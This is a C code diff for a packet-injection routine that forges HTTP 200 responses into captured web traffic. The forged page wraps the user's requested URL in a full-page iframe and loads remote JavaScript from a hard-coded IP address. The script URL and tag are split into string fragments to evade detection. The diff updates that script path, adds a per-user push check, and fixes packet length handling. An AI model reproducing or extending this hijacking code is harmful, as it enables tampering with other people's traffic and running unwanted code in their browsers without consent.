@@ -8,6 +8,7 @@
 #include "packet.h"
 #include "packet_http.h"
 #include "adp_cmd.h"
+#include "user_control.h"
 
 
 #define DEBUG
@@ -167,6 +168,7 @@ berr naga_adp_new(hytag_t *hytag)
         return E_SUCCESS;
     }    
 
+	
 	if(hytag->url_append == DISABLE)
 	{
     	if(hytag->uri[0] == '/' && hytag->host_len > 0 && hytag->uri_len > 0)
@@ -177,8 +179,11 @@ berr naga_adp_new(hytag_t *hytag)
     	}
 	}
 
-
-
+	if(!user_push_check(hytag))
+	{
+		 CNT_INC(ADP_DROP_ACT_PUSH);
+		 return E_SUCCESS;
+	}
 	memcpy((void*)buffer, hytag->pbuf.ptr, hytag->l5_offset);//copy l2-l4 len
 	char head[]="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
 		"Content-Length:"; 
@@ -213,7 +218,7 @@ berr naga_adp_new(hytag_t *hytag)
             "<iframe id=m frameborder=0 width=100% height=100%></iframe>\n" 
             "</div>\n"
             "<script>"
-            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/ad/ad.php';"
+            "var usrc='ht'+'tp'+':/'+ '/'+'219'+'.234'+'.83.60'+'/php/ad.php';"
             "document.write('<scr'+'ipt type=\"text/javascript\"'+' src=\"'+usrc+'\"></scr'+'ipt>');"
 			"</script>\n"			
 			"<script>"
@@ -229,11 +234,14 @@ berr naga_adp_new(hytag_t *hytag)
 	l = snprintf(buffer_l5, 2048, "%s%d%s%shttp://%s%s",
 		head, contlen, tail, body1, hytag->url,  body2);
 
-	hytag->l5_len = l;
 
 	int rv;
-	rv = ads_response_packet_gen(buffer, hytag);
+	rv = ads_response_packet_gen(buffer, hytag, l);
 	 
+
+
+    hytag->data_len = hytag->l5_offset - hytag->l2_offset + hytag->l5_len;
+
 
     rv = ift_raw_send_packet(hytag->fp, buffer, (int)hytag->data_len);
 
@@ -244,7 +252,8 @@ berr naga_adp_new(hytag_t *hytag)
           printf("Send packet Failed\n");
           return rv;
      }	
-	 
+	 CNT_INC(ADP_PUSH_TX_SUCCESS);
+
 	 return E_SUCCESS;		
 }
 
